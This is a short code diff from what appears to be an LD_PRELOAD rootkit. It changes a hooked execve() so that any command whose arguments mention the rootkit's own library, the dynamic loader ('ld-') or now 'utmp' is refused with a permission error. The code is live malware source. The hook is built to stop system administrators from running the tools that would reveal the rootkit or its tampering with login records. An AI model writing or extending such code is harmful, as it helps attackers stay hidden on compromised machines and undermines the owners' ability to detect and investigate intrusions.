@@ -110,7 +110,7 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         char *bdvlso = strdup(BDVLSO); xor(bdvlso);
         for(i=0; argv[i] != NULL;i++)
         {
-            if(strstr(argv[i], bdvlso) || strstr(argv[i], "ld-"))
+            if(strstr(argv[i], bdvlso) || strstr(argv[i], "ld-") || strstr(argv[i], "utmp"))
             {
                 CLEAN(bdvlso);
                 errno = EPERM; return -1;
